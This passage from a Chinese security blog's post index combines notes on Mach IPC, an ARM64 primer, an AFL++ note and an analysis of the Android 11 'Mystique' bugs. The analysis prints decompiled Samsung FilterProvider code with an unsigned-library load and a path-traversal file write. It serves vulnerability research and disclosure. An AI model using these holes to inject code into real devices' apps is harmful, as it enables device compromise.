API上，但是Mach始终保持着驱动力。尽管大多数开发者都使用它的API(Apple更喜欢)，但他们的应用程序依然十分依赖于Mach，因为Apple自己的框架和库也是这么做的。 像它设计的效率性一样，这种方式不得不作出一些让步，到目前为止(在Chapter 2中所述的那样)，XNU是一个庞大的内核。但是，如果简单地将它与Linux和Windows庞大的内核归为一类 - 就好比是将苹果与橙子进行比较。在XNU的深处，消息的发送与接收 - 仅依赖于线程，而不是相分离的进程。 Mach依然像30年前那样前卫。Mach消息机制依然是有史以来开发的最快的IPC机制之一。它可以轻易的在用户模式进程、用户和内核、或者在内核中使用。很容易地认为Mach消息机制和其他IPC机制类似，如Linux的domain socket，或者Android的Binder。然而，这样想可能会导致误解。Mach的IPC设计是基于单向通信的，而不是双向的。不难思考的是，后者可以由前者模拟出来(通过建立两个单独的通道，一个用于发送，一个用于接收)。然而，这样做的过程比其他机制要复杂得多，并且需要无条件的接受其设计决策。即使如此，随着时间的流逝，决策背后的逻辑开始变得清晰(就像它的一些原始假设一样)。 如果你是新入门Mach，本文所提出的概念即使不是很奇怪，但也不直观。我们试图去寻找其与UNIX IPC的相识之初 - 但是这两种机制是完全不同的。这需要在阅读的时候要谨慎，并且可能需要对于概念”sink in”进行重新阅读理解。 Mach-axiomsMach消息机制能通过简单的场景进行演示，以观察两个对等实体之间通信所需的步骤。在我们开始之前，我们需要先了解一些创建Mach的设计决策。由于它们深植于Mach架构中(并且，Darwin也是如此)，所以更简单的接受它们的方式是，给出一些公理。 公理1: Mach允许通过port进行IPC: Mach IPC最基本的元素是端口。端口为IPC提供了一个端点。消息可以被发送给一个端口，或者从端口处进行接收。端口可以轻易的被用户空间和内核空间的任何人创建或销毁。如果这是Mach 端口的唯一细节，则读者可能会认为它只是另一个消息队列的实现，而不予理会，比如Windows或System V的msgsend和friend。但是它远不止这些，这将为我们引出下一条公理。 公理2: 端口只能被端口权限访问: 端口的用户永远看不到端口本身，但是可以通过一种叫端口权限的东西间接进行访问。以下是一些已有的端口权限类型，这里介绍几个基础的： SEND权限: 允许持有者向底层端口发送消息，但是不从它们那里接收消息。这是一个只写能力。它可能被任意数量的线程或task中的持有者所持有。它同样是及物的，因此可以被拷贝任意次(通过COPY_SEND)，并传递给其他持有者。 SEND_ONCE: 和SEND类似，它拥有相同的能力 - 发送但不接收。不同的是，这个权限只能使用一次 - 使用完后会立即被内核取消 - 想要再次向底层端口发送消息是不可能的(除非它获取到了其他权限)。同时，它不能被复制，但是可以被移动。和SEND类似，任意数量的持有者都可以拥有一项SEND_ONCE权限。 RECEIVE: 允许它的持有者读取被发送到端口的任意消息。它在内部将它的持有者标记为端口的owner - 可以创建任意其他想要的权限。不像其他权限 - 一个端口仅有一个RECEIVE权限，并且端口仅存在于权限拥有者存活时。如果拥有者结束了(或取消分配端口)，所有SEND[ONCE]权限将变成DEAD_NAME。 总结端口权限定义，我们给出以下的表格： 表 11- 1: Mach端口权限总结 权限 数量 及物 解释 SEND 0+ MOVE，COPY 可以向端口发送任意数量的消息 SEND_ONCE 0+ 仅MOVE 仅能向端口发送一次消息 DEAD_NAME 0+ — SEND_ONCE使用后，或者SEND的接受者died/deallocated RECEIVE 1 仅MOVE 可以从端口接收消息，或者向端口插入其他权限 因此，端口权限提供了几乎与其他IPC机制相同的能力 - 但是有一个主要的区别：权限和单向，然而大多数IPC机制是双向的。 公理3: 端口权限可以通过消息进行传递: 当发送一个消息时，Mach允许发送者在消息中包含0+个端口权限，这是被消息接受者所授予的。这与UNIX的domain socket传递文件描述符的能力相似。 Mach messaging scenarios和几何学与其他科学类似，我们一旦接受了公理，就可以依据它建立更高层次、详细的结构。因此，同样的是Mach的案例。接下来，我们转向去考虑经典的A(lice)和B(ob)场景，将尝试在这两个对等实体之间建立通信。 Scenario 1: Alice and Bob假设，在这一时刻，Alice先验地知道Bob的情况。用Mach的说法，Alice拥有一个端口的发送权限，这个端口的接收权限是被Bob所有。如果我们将这些作为前提条件，接下来的交互将使Alice和Bob之间建立双向通信： Alice创建一个短暂的端口，即一个她拥有接收权限的端口。她通过调用mach_port_allocate()函数实现。(公理 1) 作为新创建端口的所有者，Alice可以创建任意她想要的其他权限。因此，她接下来为端口创建一个SEND权限，通过mach_port_insert_right()函数实现。(公理 2) Alice现在同时拥有了她新创建的端口的接收和发送权限。这对她有什么好处呢？不多，她可以单方面的发送和接收消息 - 给她自己。这几乎没什么用。但是，回忆一下，端口权限可通过消息进行传递。Alice紧接着创建一个消息给Bob，在消息中放入她的端口的发送权限，然后投递给Bob - 鉴于先验持有对Bob的发送权，我们假定她有。(假设+公理 3) Bob通过拥有接收权限的端口收到Alice的消息。依据公理3，Bob拥有了Alice端口的SEND权限。现在双方可以进行双向通信。他们可以使用任一已有的端口权限 - 尽管两者都能进一步创建一个短暂的端口(通过Alice所使用的方式)，并赋予其他人发送权限 - 因此建立了另一条单向通信通道(并且，结果是，双向通道)。 这个场景可能看上去不是很有效率(尤其是和UNIX的socket进行对比)，但是毫无疑问的是，它得到了自己想要的结果 - Alice和Bob能够自由地进行通信。事实上，不像socket，Alice享有socket不能提供的巨大的好处，即： Alice可能对和Bob之间的持续通信不感兴趣。她可能只需要Bob的一次性帮助，仅此而已。在这种情况下，Alice可以通过检查进程，将SEND权限替换为SEND_ONCE权限即可。Bob仍然可以根据Alice的这个权限进行回复 - 一旦他回复了，他和Alice的连接就将终止。不像socket，Bob不知道Alice的位置在哪，也没有任何形式的地址可以找到她。 Alice可能甚至不想给Bob一个回复的机会。当然，对等实体可以重置连接。但是其他人可以持续进行连接访问，以及重新初始化连接 - 这将导致从小问题变成完全的DoS攻击。Mach的SEND_ONCE权限提供了socket难以模拟的独特的功能。更进一步来说，发送消息但没有回复地址(实际上，是一个匿名消息)的能力是根本不存在的。 *- 这有点像POSIX的pip(2)系统调用，其创建了两个文件描述符并互相连接。在自己的进程中这样做是无用的，但是当两个文件描述符不在一起的时候，是十分有价值的 - 任意两个线程或进程 - 可以通过它们建立通信。 图 11-2: 第一个Mach消息场景 回顾一下以演示的场景，这里仍然有一个问题需要去考虑。我们先验地假设Alice已经知道了Bob。Alice拥有向Bob的RECEIVE端口SEND的权限。但是，这是一个很难的任务。Alice怎么知道Bob，他们是否以某种方式相互联系？更进一步，如果Alice已经有了一个Bob的SEND权限，并且相应的，Bob也拥有了一个Alice的SEND权限，那么所有这些复杂的交互都是无意义的。 Scenario 2: The Bootstrap Server(Registration)不存在一个简单的方式能够脱离Alice和Bob的先验性假设。它形成了一个环形的依赖关系，就像鸡和蛋问题，不是轻易能够解决的。相比于直接去击败它，我们可以将它转变为一个公理，将它变成我们的优点。因此有以下公理： 公理4: 存在一个先验的实体，系统上所有的task都拥有对其的SEND权限。 将这个新的公理付诸实施是一个简单的问题。在对等实体之间无法建立可信联系时，一般会采用一个可信的第三方的方式。一些人喜欢叫这个第三方Trent，另一些人喜欢叫Raymond。而我们将这个实体叫做bootstrap server。 现在Alice和Bob的场景将略有不同 - 因为现在不是从Alice开始的，而是从Bob和bootstrap server开始。 Bob拥有一个bootstrap server的SEND权限。(公理4) 使用这个权限，Bob能够和bootstrap server建立联系，然后通过简单的场景建立与bootstrap server之间的双向通信。(这是不是必需的，因为Bob可以在建立与server之间的联系之前，先执行下一阶段) Bob创建一个拥有RECEIVE权限的临时端口。(公理1) Bob为这个端口创建SEND权限。(公理2) Bob通过消息将SNED权限发送给bootstrap server(公理3)。这个权限可能会被移动或拷贝(这没有什么问题，因为Bob可以重新创建权限)。 同时在这个消息中，Bob会要求bootstrap server将这个权限与公开的名称相关联起来(如，”com.apple.Bob”)。这被称为bootstrap_register()消息。 过了一会儿，Alice出现了： Alice拥有一个bootstrap server的SEND权限。(公理4) 使用这个权限，Alice能够和bootstrap server建立联系，然后通过简单的场景建立与bootstrap server之间的双向通信。 Alice接着向bootstrap server发送一个消息，询问”com.apple.Bob”的位置，或者是其它她想要询问的名字。这被称为一个bootstrap_lookup()消息。 bootstrap server查询是否有人注册了这个名字。如果有(如前所述，Bob注册了)，就意味着，bootstrap server现在可以拷贝SEND权限给那个端口。这将为那个端口创建一个新的SEND权限，并将它传递给Alice。 Alice现在可以和Bob进行对话，按照简单的情况。 Bootstrap server对于连接建立来说是一个非常重要的角色，允许对等实体之间定位其他人的位置。用RPC的话来说，这被称为endpoint mapper - 接收者可能与SUNRPC的portmap(TCP 111)或Windows臭名昭著的rpcss.exe类似。在Android中，servicemanager进程提供了这个功能，然而那里的底层的传输机制是binder而不是TCP。 通过先验的假设知道所有的bootstrap server解决了在不知晓彼此的对等实体之间建立通信的巨大挑战。尽管这样做的一个明显的缺点是需要更多的信息交换，但在每个server的生命周期中注册消息仅需一次，并且查询消息在会话建立之前也仅需一次 - 所以这个缺点是微不足道的。 在继续阅读之前，思考一下能否找出bootstrap server的注册消息是否存在其它的安全相关的问题。 除了缺点之外，使用bootstrap server还是有很多优点的，最重要的是将连接建立集中起来。Bootstrap server可以选择控制连接查询(有益于系统性能)，或者直接拒绝查询特定的client(增强了系统安全性)。但是没有比bootstrap server提供的第二个方法 - Check in - 更大的优点了。 Scenario 3: The Bootstrap Server(Check-in)","link":"/2021/08/23/11%20The%20Message%20is%20the%20Medium-Mach%20IPC(the%20user%20mode%20view)/"},{"title":"ARM64从0到利用","text":"原文链接：https://highaltitudehacks.com/2020/09/05/arm64-reversing-and-exploitation-part-1-arm-instruction-set-heap-overflow/ 背景知识ARM64归属于RISC（精简指令集计算机）。 RISC架构的特点： 简单指令集，只提供有限的操作。 等长指令集。 Load/Store架构，CPU不会对内存中的数据进行操作，所有的计算都要求在寄存器中完成，而寄存器和内存的通信由Load/Store指令完成。 基于RISC的处理器具有更多的通用寄存器，且每个寄存器都可以进行数据存储或寻址。 效率高，RISC指令集能够非常有效地适用于采用流水线、超流水线和超标量技术，从而实现指令集并行操作，提高处理器性能。 ARM64 也称为 ARMv8（8.1、8.3 等），而 ARM32 是 ARMv7(s) 寄存器 ARMv8通过使用两种状态 - Aarch32和Aarch64来保持与现有32位架构的兼容性。在Aarch32下，处理器只能访问32位寄存器，Aarch64则可以访问32位和64位寄存器。 Aarch拥有31个通用寄存器，在64位状态下叫Xn，32位状态下叫Wn。 x0-x30 是 64 位通用寄存器。它们的下半部分可以通过 w0-w30 访问。 共有四个32 位宽的堆栈指针寄存器 SP_EL0、SP_EL1、SP_EL2、SP_EL3（每个用于不同的执行级别）。除此之外，还有三个异常链接寄存器ELR_EL1、ELR_EL2、ELR_EL3，三个保存的程序状态寄存器SPSR_EL1、SPSR_EL2、SPSR_EL3，以及一个程序计数器寄存器（PC）。 Arm 还使用 PC 相对寻址 - 其中它指定相对于 PC 的操作数地址（基地址） - 这有助于给出与位置无关的代码。 在 ARM64（与 ARM32 不同）中，PC 不能被大多数指令访问，尤其是不能直接访问。使用跳转或堆栈相关指令间接修改 PC。 SP（堆栈指针）寄存器永远不会被隐式修改（例如，使用 push/pop 调用）。 当前程序状态寄存器 (CPSR) 保存与 APSR 相同的程序状态标志以及一些附加信息。 操作码中的第一个寄存器通常是目标，其余是源（str、stp 除外）。 寄存器 目的 x0 -x7 参数（最多 8 个）- 剩余的在堆栈上 x8 -x18 通用，保存变量。从函数返回时不能做任何假设 x19 -x28 如果被函数使用，必须保留它们的值，然后在返回给调用者时恢复 x29 (fp) 帧指针（指向帧底部） x30 (lr) 链接寄存器。保存调用的返回地址 x16 保持系统调用 # in (SVC 0x80) 调用 x31 (sp/(x/w)zr) 堆栈指针 (sp) 或零寄存器（xzr 或 wzr） pc 程序计数器寄存器。包含要执行的下一条指令的地址 APSR / CPSR 当前程序状态寄存器（保存标志） 特殊寄存器 Name Size Description WZR 32bits Zero register XZR 64bits Zero register WSP 32bits Current stack pointer SP 64bits Current stack pointer PC 64bits Program counter ARMv8通过异常级别来实现操作系统的特权分级，编号越高特权越高。处理异常时，异常级别可以增加或保持不变。从异常返回时，异常级别可以降低或保持不变。执行状态可以通过获取或返回异常来实现。上电时，设备进入最高异常级别。 系统寄存器 特定于系统的寄存器，如iOS中： 读写系统寄存器 MRS，systemreg -&gt; 从系统寄存器读取到目标寄存器 Xt MSR，systemreg -&gt; 将 Xt 寄存器中存储的值写入到系统寄存器 例如： 12MSR PAN, #1 设置 PAN 位MSR PAN, #0 清除 PAN 位 函数序言/结语看一个例子： 12345678910111213141516171819202122232425262728__text:0000000100007E08 ; int __cdecl main(int argc, const char **argv, const char **envp)__text:0000000100007E08 EXPORT _main__text:0000000100007E08 _main__text:0000000100007E08__text:0000000100007E08 var_10 = -0x10__text:0000000100007E08 var_s0 = 0__text:0000000100007E08__text:0000000100007E08 ; FUNCTION CHUNK AT __stubs:0000000100007E4C SIZE 0000000C BYTES__text:0000000100007E08__text:0000000100007E08 STP X20, X19, [SP,#-0x10+var_10]! ; 函数序言__text:0000000100007E0C STP X29, X30, [SP,#0x10+var_s0]__text:0000000100007E10 ADD X29, SP, #0x10__text:0000000100007E14 BL _get_iomfb_uc__text:0000000100007E18 CBZ W0, loc_100007E34__text:0000000100007E1C MOV X19, X0__text:0000000100007E20 BL _do_trigger__text:0000000100007E24 MOV X0, X19__text:0000000100007E28 LDP X29, X30, [SP,#0x10+var_s0]__text:0000000100007E2C LDP X20, X19, [SP+0x10+var_10],#0x20__text:0000000100007E30 B _IOServiceClose__text:0000000100007E34 ; ---------------------------------------------------------------------------__text:0000000100007E34__text:0000000100007E34 loc_100007E34 ; CODE XREF: _main+10↑j__text:0000000100007E34 LDP X29, X30, [SP,#0x10+var_s0] ; 函数结语__text:0000000100007E38 LDP X20, X19, [SP+0x10+var_10],#0x20__text:0000000100007E3C RET__text:0000000100007E3C ; End of function _main 函数调用约定 参数在 x0-x7 寄存器中传递，其余在堆栈中传递。 ret 命令用于返回链接寄存器中的地址（默认值为 x30）。 函数的返回值存储在 x0 或 x0+x1 中，具体取决于它是 64 位还是 128 位。 x8 是间接结果寄存器，用于传递间接结果的地址位置，例如函数返回一个大结构的地方。 使用 B 操作码跳转到函数。 带链接分支 (BL) 将下一条指令的地址（在 BL 之后）复制到分支前的链接寄存器 (x30)。 因此，BL 用于子程序调用 BR调用用于分支注册，例如br x8。 BLR 代码用于跳转寄存器并将下一条指令的地址（在 BL 之后）存储到链接寄存器（x30）中。 Opcodes Opcodes Purpose MOV 将一个寄存器移动到另一个 MOVN 将一个负数值移动到寄存器 MOVK 将16位移入寄存器，其余保持不变 MOVZ Move shifted 16-bit registers, leaving the rest unchanged lsl/lsr 逻辑左移，逻辑右移 ldr 从寄存器加载 str 存储到寄存器 ldp/stp 出入栈指令，可以同时操作两个寄存器 adr pc相对偏移处的标签地址 adrp pc相对偏移处的页面地址 cmp 比较两个值，标志会自动更新（N - 结果位 31，如果结果为零，则 Z，如果溢出，则 V，如果不借位，则 C） bne 如果零位标志未设置则分支 例子： mov x0, x1 -&gt; x0 = x1 movn x0, 1 -&gt; x0 = -1 add x0, x1 -&gt; x0 = x0 + x1 ldr x0, [x1] -&gt; x0 = *x1 ldr x0, [x1, 0x10]! -&gt; x1 += 0x10; x0 = *x1(Pre-Indexing mode) ldr x0, [x1], 0x10 -&gt; x0 = *x1; x1 += 0x10 (Post-Indexing mode) str x0, [x1] -&gt; *x1 = x0 ldr x0, [x1, 0x10] -&gt; x0 = *(x1 + 0x10) ldrb w0, [x1] -&gt; w0 = *x1，取出一字节 ldrsb w0, [x1] -&gt; w0 = *x1，取出有符号一字节 adr x0, label -&gt; x0 = label stp x0, x1, [x2] -&gt; *x2 = x0; *(x2 + 8) = x1 stp x29, x30, [sp, -64]! -&gt; 存储x29, x30 (LR) 的值到栈上 ldp x29, x30, [sp], 64] -&gt; 从栈上取值到 x29, x30 (LR) 中 svc 0 -&gt; 执行系统调用 (系统调用号存储在 x16 寄存器中) blr x0 -&gt; 调用 x0 中存储的函数, 将下一条指令地址存储在链接寄存器中 (x30) br x0 -&gt; 跳转到 x0 指向的地址 bl label -&gt; 跳转到分支, 将下一条指令地址存储在链接寄存器中 (x30) ret -&gt; 跳转到 x30 中存储的返回地址处","link":"/2022/03/27/ARM64%E4%BB%8E0%E5%88%B0%E5%88%A9%E7%94%A8/"},{"title":"AFL++ 阅读笔记 - 技术细节","text":"代码覆盖率统计插桩指令的功能是检测边缘覆盖率和分支命中计数，插桩指令等价于下面的代码: 123cur_location = &lt;COMPILE_TIME_RANDOM&gt;;shared_mem[cur_location ^ prev_location]++; prev_location = cur_location &gt;&gt; 1; cur_location的值是随机生成的，shared_mem数组是一个64KB的SHM内存区域，数组中的每一个字节表示是否命中对应的( branch_src, branch_dst) 元组。最后一行的右移是为了使元组具有方向性。","link":"/2021/11/28/AFL-%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0-%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82/"},{"title":"Android 11 魔形女漏洞","text":"前言可以参考京东的白皮书，漏洞倒是不难理解，本来是想写exp的，但是有点累🥱，想想还是先整理整理文档，找找感觉吧。 1. CVE-2021-0691这是一个AOSP的漏洞，对于正常的system_app的Selinux策略来讲，不应该具备写/data/app目录的权限，但是Android 11 中却加入了： 1234567891011index e5d7d18..1432017 100644--- a/private/system_app.te+++ b/private/system_app.te@@ -69,6 +69,9 @@# Settings need to access app name and icon from asecallow system_app asec_apk_file:file r_file_perms;+# Allow system_app (adb data loader) to write data to /data/incremental+allow system_app apk_data_file:file write;+# Allow system apps (like Settings) to interact with statsdbinder_call(system_app, statsd) apk_data_file指的是/data/app，这里存放的是应用程序的代码文件： 12345678910111213141516171819202122a70q:/data/app/com.unionpay.tsmservice-0bfCG-Zd90PuEwegtR8UzQ== # ls -lR.:total 6184-rw-r--r-- 1 system system 6308538 2021-01-01 01:22 base.apkdrwxr-xr-x 3 system system 4096 2021-01-01 01:22 libdrwxrwx--x 3 system install 4096 2021-01-01 01:22 oat./lib:total 8drwxr-xr-x 2 system system 4096 2021-01-01 01:22 arm64./lib/arm64:total 2092-rwxr-xr-x 1 system system 185816 1979-11-30 00:00 libentryexpro.so-rwxr-xr-x 1 system system 723744 1979-11-30 00:00 libuptsmaddon.so-rwxr-xr-x 1 system system 1216480 1979-11-30 00:00 libuptsmservice.so./oat:total 8drwxrwx--x 2 system install 4096 2021-01-01 01:22 arm64./oat/arm64:total 2588-rw-r--r-- 1 system all_a192 28672 2021-01-01 01:22 base.art-rw-r--r-- 1 system all_a192 87712 2021-01-01 01:22 base.odex-rw-r--r-- 1 system all_a192 2517132 2021-01-01 01:22 base.vdex 这个改动意味着，拥有system_app uid 的程序能够去覆写其他APP的代码文件，包括so和base.apk，实现代码注入。这个代码的引入是因为incremental install功能，这个功能用于大小超过1 GB的应用程序的安装，在Android 11 Preview 1中，AdbDataLoader被加入以支持incremental install，因此，system_app的策略被修改了。虽然后来经过了一些变动（AdbDataLoader被移除了），但是这个策略却被保留了下来。 2. 漏洞利用 - 静态分析为了利用第一步中发现的漏洞，做了一些静态分析的工作，其实，利用思路也很简单，就是从系统应用程序中，找到一个bug，这个bug可以实现任意文件写。 这个问题可以转化为Java语言的source-sink类型的data-flow污点分析问题，可以使用基于Soot的IFDS（Inter-procedure， Finite， Distributive）框架进行解决。 对于任一污点分析问题，我们首先应该定义清楚source和sink，对于source的定义如下： 导出的Activity、Service、Broadcast Receiver或Content Provider中接收的Intent； 可控制的输入流中接收的数据，如socket； 可控制的位置处接收的文件，如攻击者包数据和全局可读/写的位置。 sink的定义如下： 文件输出流； 动态代码加载功能； 命令执行功能。 剩下的就是去优化了，京东是使用了自己的分析工具，叫Star Watcher，基于FlowDroid。这个工具的特点是对上下文、流、字段和对象敏感，工作在过程间控制流图上，为了比其他工具好，在设计时考虑了以下几点： 构建了一个完整的调用图：一个完整的调用图是所有后续分析的基础，如数据流和污点分析。目前最先进的SPARK Java指针分析，会漏掉某些分配节点，如： 例1 1234567891011121314151617181920212223242526272829public class Sample { public void target() { for(Helper helper: helpers) helper.handle(); } Set&lt;Helper&gt; helpers; public Sample () { this.helpers = new HashSet&lt;&gt;(); this.helpers.add(new HelperImplA()); }}interface Helper { public void handle();}class HelperImplA implements Helper { @Override public void handle() { System.out.println(&quot;wtf&quot;); }}class HelperImplB implements Helper { @Override public void handle() {} Spark指针分析不能处理这种情况，即元素被放入容器，然后被取出，它不能在handler.handle()的调用位置决定Helper的类型。因此，handler.handle的调用边在调用图中缺失。如果handle函数中存在可能的数据流，就会导致遗漏。 例2 12345678910class AParcelable implements Parcelable { void func() { }}class MainActivity extends Activity { public void onResume() { AParcelable p = getIntent().getParcelableExtra(&quot;p&quot;); p.func(); }} 对于例2，AParcelable类的分配是在解parcelable时在库的代码中完成的，这超出了分析范围。在这个例子中，Spark也未能正确地检测到这个变量的分配节点，从而导致调用图中目标类的调用边丢失。 为了解决这个问题，京东使用的办法是结合CHA算法，通过CHA算法，将可能丢失的边添加到调用图中，实验证明是有效的。 组件入口点改变也会影响到调用图的完整性，京东的解决方法是，在分析的过程中，建立一个假的main方法，调用所有组件的生命周期方法来模拟Android框架的行为。比如说，在API 29中增加了一个新的Content Provider的函数call的变体。 通过舍弃不相关的数据流优化执行性能，IFDS算法本质上是一种定点算法。它需要保留与每个语句相关的数据事实，以决定我们是否应该停止。IFDS算法的工作对象是过程间的CFG，并将流函数分为四种类型： NormalFlowFuntions CallFlowFunctions ReturnFlowFunctions CallToReturnFlowFunctions 对于污点的实例，CallFlow负责决定是否将其传递给调用者函数，正常情况下，如果调用者函数是一个实例调用（virtual函数），IFDS将传递这个污点实例，并记录对应语句创建的/缓存的边，因为污点隐式地与this实例相关。但是，如果实例字段从未被读或写，我们就不需要传递它。所以这一点是可以进行优化的。 通过对icfg进行快速的预检查和缓存实例分析，可以解决原来算法的OOM错误，并提高运行速度。 3. 厂商 bug3.1 Camera 和 FilterProvider 中的权限提升漏洞编号：CVE-2021-25510、CVE-2021-25511，并在2021年12月的三星安全公告中修复。 当一个具有com.sec.android.camera.permission.USE_EFFECT_FILTER权限当包被安装后，FilterProvider自动通过其注册的广播接收器收到通知，并将其识别为一个CAMERA EFFECT FILTER。目标包中的文件被提取到/data/DownFilters/Lib64/，函数如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768package com.samsung.android.provider.filterprovider;class FilterInstaller { //... private String copyFileFromAssets(AssetManager arg10, String arg11, String arg12, boolean arg13) { //... private void installLibFilter(Context arg11, String arg12) { Resources v11_1; Log.d(&quot;FilterInstaller&quot;, &quot;install filter for Lib&quot;); try { v11_1 = arg11.getPackageManager().getResourcesForApplication(arg12); } catch(PackageManager.NameNotFoundException v11) { Log.e(&quot;FilterInstaller&quot;, &quot;installLibFilter, resource error, package name : &quot; + arg12 + &quot;, exception : &quot; + v11.toString()); return; } AssetManager v12 = v11_1.getAssets(); String[] v2 = new String[0]; try { v2 = v12.list(&quot;so&quot;); } catch(IOException v3) { Log.e(&quot;FilterInstaller&quot;, &quot;installLibFilter, asset lib list exception : &quot; + v3.toString()); } if(v2.length &lt;= 0) { Log.e(&quot;FilterInstaller&quot;, &quot;asset lib list length is small than 0&quot;); return; } int v3_1 = v2.length; int v4; for(v4 = 0; v4 &lt; v3_1; ++v4) { String v5 = v2[v4]; Log.d(&quot;FilterInstaller&quot;, &quot;filterFile : &quot; + v5); if(this.storeLibFilters(v12, v11_1, v5, v5.split(&quot;\\\\.&quot;)[0]) == -1L &amp;&amp; (v5.endsWith(&quot;.so&quot;))) { Log.e(&quot;FilterInstaller&quot;, &quot;storeLibFilters fail&quot;); } } this.mServiceContext.getContentResolver().notifyChange(Constants.URI_NOTIFY_ADD, null); } //... private long storeLibFilters(AssetManager arg18, Resources arg19, String arg20, String arg21) { //... if((arg20.endsWith(&quot;.so&quot;)) &amp;&amp; !this.checkSoSignature(v6)) { Log.e(&quot;FilterInstaller&quot;, &quot;Signature check failed.&quot;); return -1L; } if(!arg20.endsWith(&quot;.sig&quot;)) { ContentResolver v10 = this.mServiceContext.getContentResolver(); ContentValues v11 = new ContentValues(); try { int v8_1 = arg19.getIdentifier(arg21 + &quot;_title&quot;, &quot;string&quot;, this.mPackageName); int v9_1 = arg19.getIdentifier(arg21 + &quot;_vendor&quot;, &quot;string&quot;, this.mPackageName); int v4 = arg19.getIdentifier(arg21 + &quot;_version&quot;, &quot;string&quot;, this.mPackageName); Log.e(&quot;FilterInstaller&quot;, &quot;title = &quot; + arg19.getString(v8_1) + &quot; vendor = &quot; + arg19.getString(v9_1) + &quot;, version = &quot; + arg19.getString(v4)); v11.put(&quot;name&quot;, arg19.getString(v8_1)); v11.put(&quot;filename&quot;, v6); v11.put(&quot;version&quot;, arg19.getString(v4)); v11.put(&quot;vendor&quot;, arg19.getString(v9_1)); v11.put(&quot;package_name&quot;, this.mPackageName); v11.put(&quot;title_id&quot;, Integer.valueOf(v8_1)); v11.put(&quot;preload_filter&quot;, Integer.valueOf(0)); v11.put(&quot;filter_type&quot;, &quot;SINGLE&quot;); v11.put(&quot;category&quot;, Integer.valueOf(2)); v11.put(&quot;vendor_package_name&quot;, this.mPackageName); if(v0_2 != null) { v11.put(&quot;texture&quot;, v13); } } //... tex和so文件将被提取，但是，对于so文件，FilterProvider将对包有一些检查。一个.sig签名文件必须伴随着预先创建的RSA公钥并经过验证，否则，Content Provider将拒绝将其插入到content://com.samsung.android.provider.filterprovider/filters表中。开发者的目的应该是，这样的文件是由三星的私钥签名并通过公钥验证，这样该包就可以在相机应用商店分发。但是，这里有一个问题：**校验过程只针对so，而没有包含SO**。这样，当下一次相机应用程序被打开时，并点击相应的图标后，所有的过滤器将被预装到相机进程空间中，相应的代码在libcamera_effect_processor_jni.so中： 123456789101112131415161718192021222324252627282930313233343536373839404142__int64 __fastcall sub_13A3A4(__int64 a1, char *a2, char *s1){ //... v28 = 0LL; ptr[0] = 0LL; if ( strcmp(s1, &quot;com.samsung.android.provider.filterprovider&quot;) &amp;&amp; *(_DWORD *)(a1 + 36) != 2 ) { asprintf(ptr, &quot;%s%s&quot;, &quot;/data/DownFilters/Lib64/&quot;, a2); v7 = &quot;/data/DownFilters/Tex/&quot;; LABEL_11: ptr[1] = v7; goto LABEL_12; } v5 = *(_QWORD *)(a1 + 16); if ( v5 ) { v6 = sub_57490(v5, a2); if ( v6 ) { if ( v6 != 400 ) { if ( (sub_57748(*(_QWORD *)(a1 + 16), (int)ptr, a2) &amp; 1) != 0 ) sub_575C4(*(_QWORD *)(a1 + 16), (int)&amp;v28, a2); else asprintf(ptr, &quot;%s%s&quot;, &quot;/system/lib64/&quot;, a2); v7 = &quot;/system/cameradata/preloadfilters/Tex/&quot;; goto LABEL_11; } } } LABEL_12: __android_log_print(3, &quot;SECIMAGING&quot;, &quot;Try to open external effect (%s)&quot;, ptr[0]); *(_QWORD *)(a1 + 56) = dlopen(ptr[0], 2); free(ptr[0]); v8 = *(void **)(a1 + 56); if ( !v8 ) { v19 = dlerror(); __android_log_print(6, &quot;SECIMAGING&quot;, &quot;Filter %s dlopen failed&quot;, v19); return 0LL; } v9 = (__int64 (*)(void))dlsym(v8, &quot;Create&quot;); 赋予相机应用程序WRITE_EFFECT_FILTER权限以后，FilterProvider的服务MyFilterService将能够接收Intent，并将其写入到文件中： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273package com.samsung.android.provider.filterprovider;void install(Bundle arg15) { Log.d(&quot;MyFilterInstaller&quot;, &quot;install&quot;); if(arg15 == null) { Log.e(&quot;MyFilterInstaller&quot;, &quot;install : bundle is null, return.&quot;); return; } this.createMyFilterDirectory(); String v2 = arg15.getString(&quot;name&quot;); String v4 = arg15.getString(&quot;filename&quot;); byte[] v6 = arg15.getByteArray(&quot;filter_thumbnail&quot;); String v7 = v2 + &quot;.bmp&quot;; String v8 = this.copySelFileFromIntent(MyFilterInstaller.FILTER_STORAGE_MY_FILTER + &quot;/&quot; + v4, arg15); if(v8 == null) { Log.e(&quot;MyFilterInstaller&quot;, &quot;install : sel file copy failed = &quot; + v4 + &quot; return.&quot;); return; }//.. /data/xxx/ + &quot;../../../../../&quot;private String copySelFileFromIntent(String arg9, Bundle arg10) { byte[] v9_1; FileOutputStream v10; File v5; int v4 = 0; try { v5 = new File(arg9); goto label_13; } catch(Exception unused_ex) { v10 = null; v5 = null; goto label_43; try { label_13: if(v5.exists()) { v5.delete(); Log.w(&quot;MyFilterInstaller&quot;, &quot;The named file already exists : &quot; + arg9 + &quot;. So remove file.&quot;); } v5.createNewFile(); v9_1 = arg10.getByteArray(&quot;filter_data&quot;); v10 = new FileOutputStream(v5); goto label_33; } catch(Exception unused_ex) { v10 = null; goto label_43; try { label_33: v10.write(v9_1); if(!v5.setExecutable(true, false)) { Log.e(&quot;MyFilterInstaller&quot;, &quot;filter.setExecutable when copy from asset is not complete properly&quot;); } if(!v5.setReadable(true, false)) { Log.e(&quot;MyFilterInstaller&quot;, &quot;filter.setReadable when copy from asset is not complete properly&quot;); } } catch(Exception unused_ex) { label_43: Log.e(&quot;MyFilterInstaller&quot;, &quot;copySelFileFromIntent : Exception is occurred.&quot;); if(v10 != null) { try { v10.close(); } catch(IOException unused_ex) { Log.e(&quot;MyFilterInstaller&quot;, &quot;copySelFileFromIntent : Exception is occurred.&quot;); } //... try { v10.close(); } catch(IOException unused_ex) { Log.e(&quot;MyFilterInstaller&quot;, &quot;copySelFileFromIntent : Exception is occurred.&quot;); goto label_62; } 这个服务被签名权限所保护： 123456789&lt;service android:enabled=&quot;true&quot; android:exported=&quot;true&quot;android:name=&quot;com.samsung.android.provider.filterprovider.MyFilterService&quot;android:permission=&quot;com.samsung.android.provider.filterprovider.permission.WRITE_FILTER&quot;&gt; &lt;intent-filter&gt; &lt;action 